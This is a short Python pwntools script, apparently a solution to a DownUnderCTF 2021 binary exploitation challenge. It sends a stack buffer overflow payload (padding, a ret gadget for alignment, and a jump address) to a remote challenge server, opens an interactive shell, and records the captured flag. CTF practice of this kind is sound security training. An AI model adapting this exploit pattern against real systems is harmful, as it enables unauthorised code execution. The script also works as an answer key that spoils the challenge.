from pwn import *
context(os='linux', arch='amd64')
context.log_level = 'debug'

p = remote('pwn-2021.duc.tf', 31921)

p.sendline(b'a'*0x18 + p64(0x401016) + p64(0x4011d7)) # 加个ret 栈对齐
p.interactive()

# DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}